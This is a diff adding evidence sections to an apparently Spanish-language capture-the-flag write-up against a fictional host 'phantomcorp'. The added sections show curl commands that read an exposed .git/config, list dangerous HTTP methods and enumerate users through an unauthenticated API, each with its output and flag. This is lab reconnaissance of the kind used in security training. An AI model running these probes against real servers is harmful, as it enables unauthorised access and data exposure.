@@ -98,3 +98,51 @@ root@attacker:/loot# curl -s http://phantomcorp/.git/config
 [core]
         repositoryformatversion = 0
         bare = false
+[remote "origin"]
+        url = https://git.internal.phantomcorp/intranet.git
+# Un .git expuesto filtra codigo, historia y a veces secretos.
+# FLAG{git_repo_exposed}
+```
+
+
+
+### 2.3 - Evidencia: métodos HTTP peligrosos
+```console
+root@attacker:/loot# curl -X OPTIONS -i http://phantomcorp/
+HTTP/1.0 200 OK
+Server: PhantomServer/3.7 
+Date: Fri, 11 Sep 2026 23:30:01 GMT
+Allow: GET, POST, PUT, DELETE, OPTIONS
+X-Dangerous-Methods: FLAG{http_methods_put_enabled}
+```
+
+
+### 2.4 - Evidencia: API de usuarios expuesta
+```text
+root@attacker:/loot# curl -s http://phantomcorp/api/users | python3 -m json.tool
+```
+```json
+{
+    "users": [
+        {
+            "id": 1,
+            "user": "admin",
+            "role": "superuser"
+        },
+        {
+            "id": 2,
+            "user": "jperez",
+            "role": "editor"
+        },
+        {
+            "id": 3,
+            "user": "mgomez",
+            "role": "viewer"
+        }
+    ],
+    "note": "endpoint interno de RRHH - no exponer",
+    "flag": "FLAG{user_enumeration_api}"
+}
+```
+
+
